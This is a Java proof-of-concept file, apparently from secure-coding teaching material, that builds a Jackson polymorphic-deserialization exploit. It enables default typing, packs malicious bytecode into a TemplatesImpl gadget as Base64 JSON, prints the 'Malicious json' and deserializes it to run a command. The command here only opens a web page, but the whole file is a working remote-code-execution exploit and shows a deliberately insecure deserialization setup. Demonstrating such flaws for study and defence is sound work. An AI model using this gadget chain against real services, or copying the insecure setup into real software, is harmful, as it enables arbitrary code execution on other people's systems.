// The MIT License (MIT)
// Copyright (c) 2017 Moritz Bechler
// Copyright (c) 2018 Robert C. Seacord
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package jackson;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import ser05j.Reflections;

import java.util.Base64;

public class Cage {

  private static final ObjectMapper mapper = new ObjectMapper();

  private static Object deserialize(String data) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    // deserialize as Object or permissive tag interfaces such as java.io.Serializable
    return mapper.readValue(data, Object.class);
  }

  private static byte[] createMaliciousByteCodes()
      throws IOException, InstantiationException, InvocationTargetException, NoSuchFieldException,
             IllegalAccessException, CannotCompileException, NotFoundException, ClassNotFoundException,
             NoSuchMethodException {
    String[] args = {"open", "http://www.google.com"};
    Object tpl = TemplatesUtil.createTemplatesImpl(args);
    return ((byte[][]) Reflections.getFieldValue(tpl, "_bytecodes"))[0];
  }

  private static JsonNode createTemplateValues()
      throws IOException, InstantiationException, InvocationTargetException, NoSuchFieldException,
             IllegalAccessException, CannotCompileException, NotFoundException, ClassNotFoundException,
             NoSuchMethodException {
    ObjectNode values = mapper.createObjectNode();
    byte[] byteCodes = createMaliciousByteCodes();
    String encodedByteCodes = Base64.getEncoder().encodeToString(byteCodes);

    ArrayNode transletBytescodes = mapper.createArrayNode();
    transletBytescodes.add(encodedByteCodes);
    values.set("transletBytecodes", transletBytescodes);

    values.put("transletName", "foo");
    values.set("outputProperties", mapper.createObjectNode());
    return values;
  }

  public static String rcePayload() throws
      IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
      NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
    JsonNode templateValues = createTemplateValues();
    ArrayNode wrapperNode = mapper.createArrayNode();
    wrapperNode.add("org.apache.xalan.xsltc.trax.TemplatesImpl");
    wrapperNode.add(templateValues);
    return mapper.writerWithDefaultPrettyPrinter().writeValueAsString(wrapperNode);
  }

  public static void main(String[] args) throws Exception {

    // Writes gadget by hand and then deserializes using unmarshal
    String json = rcePayload();
    System.out.println("Malicious json: " + json);
    deserialize(json);
  }

} // end class Cage
